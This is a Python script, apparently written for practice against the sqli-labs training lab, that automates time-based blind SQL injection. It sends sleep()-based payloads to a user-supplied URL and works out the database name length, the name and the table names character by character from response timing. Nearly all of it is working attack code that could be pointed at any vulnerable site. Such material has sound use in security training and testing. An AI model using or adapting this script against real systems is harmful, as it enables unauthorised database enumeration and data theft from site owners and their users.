# !/usr/bin/python
# -*- coding:utf-8 -*-
# __Author__: VVzv

import time, pygrape
import requests
from termcolor import cprint, colored
from threading import Thread

"""
database: 
    - security
tables:
    - emails
    - referers
    - uagents
    - users
"""

class SqlBlindInjectionGuess():

    def __init__(self, url, **params):
        self.url = url
        self.string = 'zxcvbnmasddfghjklqwertyuiop1234567890_'
        self.new_time = time.strftime("[%H:%M:%S]", time.localtime())

    # 获取payload请求及时间
    def getPayloadUrlRes(self,payload):
        start = time.time()
        r = requests.get(self.url + payload)
        end = time.time()
        r_time = end - start
        return r_time

    def postPayloadUrlRes(self,payload, **params):
        start = time.time()
        data_from = params
        r = requests.post(self.url+payload, data=data_from)
        end = time.time()
        r_time = end - start
        return r_time

    # 获取数据库长度
    def getDatabaseLength(self):
        for n in range(1, 30):
            payload = "' and if(length(database())={}, sleep(5), 1)--+".format(n)
            r_time = self.getPayloadUrlRes(payload)
            if r_time >= 5:
                cprint("[+]%s 数据库长度为:%s" % (self.new_time, n), 'blue')
                return (1, n)

    # 获取数据库名称
    def getDatabaseName(self, num, data=''):
        for s in self.string:
            payload = "' and if(left(database(),{})='{}', sleep(5),1)--+".format(num[0], ''.join(data+s))
            r_time = self.getPayloadUrlRes(payload)
            if r_time  >= 5:
                data += s
                if len(data) == num[1]:
                    cprint("[+]%s 数据库名称为:\n-" %(self.new_time) + data, 'blue', attrs=['bold'])
                    break
                break
        if len(data) != num[1]:
            return self.getDatabaseName((num[0]+1, num[1]), data)


    # 获取数据库表名
    def getTables(self, range_num=1, data='', index=0):
        count = 1
        for s in self.string:
            payload = "' and if( left((select table_name from information_schema.tables where table_schema=database() limit {},1),{})='{}' ,sleep(5),1)--+".format(index, range_num, ''.join(data+s))
            r_time = self.getPayloadUrlRes(payload)
            if r_time <= 5:
                count += 1
            if r_time >= 5:
                data += s
                if count < len(self.string):
                    return self.getTables(range_num+1, data, index)
            elif count >= len(self.string):
                if data == None:
                    return
                elif len(data) < 1:
                    return
                else:
                    cprint("    -%s" %data, 'blue', attrs=['bold'])
                    return data

    def getMoreTables(self):
        for n in range(0,100):
            data = self.getTables(index=n)
            if data == None:
                break
            elif len(data) < 1:
                break

    def getDumb(self):
        pass

    def main(self):
        start_time = time.time()
        num = self.getDatabaseLength()
        self.getDatabaseName(num)
        # self.getTables()
        self.getMoreTables()
        # database_name = colored(database_name, attrs=['reverse','bold'])
        end_time = time.time()
        use_time = int(end_time - start_time)
        cprint('[+]%s 共花费%ss找到数据库名称.....' %(time.strftime("[%H:%M:%S]", time.localtime()), use_time), 'green', attrs=['bold'])
        # cprint("[+]%s 数据库名称为:" %(time_show) + database_name, on_color='on_cyan',attrs=['reverse'])


if __name__ == '__main__':
    # writer = pygrape.pygrape(0.05)
    url = input('输入靶场地址：') #'http://ip_addr/sqli/Less-8/?id=1'
    cprint('[*]%s加载中...'%time.strftime("[%H:%M:%S]", time.localtime()), 'green')
    s = SqlBlindInjectionGuess(url)
    s.main()


